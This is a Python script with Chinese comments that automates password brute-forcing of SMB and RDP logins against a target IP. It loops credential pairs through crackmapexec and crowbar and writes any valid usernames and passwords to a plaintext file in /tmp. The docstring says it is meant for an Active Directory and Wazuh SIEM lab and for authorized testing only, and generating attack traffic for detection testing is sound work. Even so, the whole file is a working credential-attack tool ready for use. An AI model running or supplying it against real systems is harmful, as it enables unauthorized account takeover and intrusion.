#!/usr/bin/env python3
"""
暴力破解自动化脚本 - AD + Wazuh SIEM 实验室
支持 SMB 和 RDP 两种协议的暴力破解
仅用于授权的安全测试环境
"""

import subprocess
import sys
import time
import argparse
from datetime import datetime

class BruteForce:
    def __init__(self, target, users_file, passwords_file, protocol="smb", threads=4):
        self.target = target
        self.users = self._read_file(users_file)
        self.passwords = self._read_file(passwords_file)
        self.protocol = protocol
        self.threads = threads
        self.results = []
        self.start_time = None

    def _read_file(self, filepath):
        """读取字典文件"""
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip()]

    def _log(self, message, level="INFO"):
        """日志输出"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")

    def smb_bruteforce(self):
        """SMB 暴力破解（使用 hydra）"""
        self._log(f"开始 SMB 暴力破解: {self.target}")
        self._log(f"用户数: {len(self.users)}, 密码数: {len(self.passwords)}")

        cmd = [
            "hydra",
            "-L", "/dev/stdin",
            "-P", "/dev/stdin",
            f"smb://{self.target}",
            "-t", str(self.threads),
            "-f",  # 找到一个就停止
            "-vV"
        ]

        # 使用 crackmapexec 更可靠
        found = False
        for user in self.users:
            if found:
                break
            for pwd in self.passwords:
                self._log(f"尝试: {user}:{pwd}")
                try:
                    result = subprocess.run(
                        ["crackmapexec", "smb", self.target, "-u", user, "-p", pwd],
                        capture_output=True, text=True, timeout=10
                    )
                    if "[+]" in result.stdout and "Pwn3d!" in result.stdout:
                        self._log(f"成功找到凭证: {user}:{pwd}", "SUCCESS")
                        self.results.append({"user": user, "password": pwd, "protocol": "smb"})
                        found = True
                        break
                    elif "[+]" in result.stdout:
                        self._log(f"凭证有效: {user}:{pwd}", "SUCCESS")
                        self.results.append({"user": user, "password": pwd, "protocol": "smb"})
                except subprocess.TimeoutExpired:
                    self._log(f"超时: {user}:{pwd}", "WARN")
                except Exception as e:
                    self._log(f"错误: {e}", "ERROR")

        return self.results

    def rdp_bruteforce(self):
        """RDP 暴力破解（使用 crowbar）"""
        self._log(f"开始 RDP 暴力破解: {self.target}")

        # 写入临时用户文件
        with open("/tmp/rdp_users.txt", "w") as f:
            f.write("\n".join(self.users))

        # 写入临时密码文件
        with open("/tmp/rdp_passwords.txt", "w") as f:
            f.write("\n".join(self.passwords))

        try:
            result = subprocess.run(
                ["crowbar", "-b", "rdp", "-s", f"{self.target}/32",
                 "-u", "/tmp/rdp_users.txt", "-c", "/tmp/rdp_passwords.txt",
                 "-n", str(self.threads)],
                capture_output=True, text=True, timeout=300
            )
            self._log(f"crowbar 输出:\n{result.stdout}")
        except Exception as e:
            self._log(f"RDP 破解失败: {e}", "ERROR")

        return self.results

    def run(self):
        """执行暴力破解"""
        self.start_time = datetime.now()
        self._log("=" * 50)
        self._log(f"暴力破解开始")
        self._log(f"目标: {self.target}")
        self._log(f"协议: {self.protocol.upper()}")
        self._log("=" * 50)

        if self.protocol == "smb":
            results = self.smb_bruteforce()
        elif self.protocol == "rdp":
            results = self.rdp_bruteforce()
        else:
            self._log(f"不支持的协议: {self.protocol}", "ERROR")
            return

        elapsed = (datetime.now() - self.start_time).total_seconds()
        self._log("=" * 50)
        self._log(f"暴力破解完成，耗时: {elapsed:.2f} 秒")
        if results:
            self._log(f"找到 {len(results)} 组有效凭证:", "SUCCESS")
            for r in results:
                self._log(f"  {r['user']}:{r['password']} ({r['protocol']})", "SUCCESS")
        else:
            self._log("未找到有效凭证", "WARN")
        self._log("=" * 50)

        # 保存结果
        with open("/tmp/bruteforce_results.txt", "w") as f:
            for r in results:
                f.write(f"{r['user']}:{r['password']}\n")
        self._log("结果已保存到 /tmp/bruteforce_results.txt")


def main():
    parser = argparse.ArgumentParser(description="暴力破解自动化脚本（仅用于授权测试）")
    parser.add_argument("-t", "--target", required=True, help="目标 IP 地址")
    parser.add_argument("-U", "--users", required=True, help="用户名字典文件")
    parser.add_argument("-P", "--passwords", required=True, help="密码字典文件")
    parser.add_argument("-p", "--protocol", default="smb", choices=["smb", "rdp"], help="协议 (默认: smb)")
    parser.add_argument("-T", "--threads", type=int, default=4, help="线程数 (默认: 4)")

    args = parser.parse_args()

    bf = BruteForce(args.target, args.users, args.passwords, args.protocol, args.threads)
    bf.run()


if __name__ == "__main__":
    main()
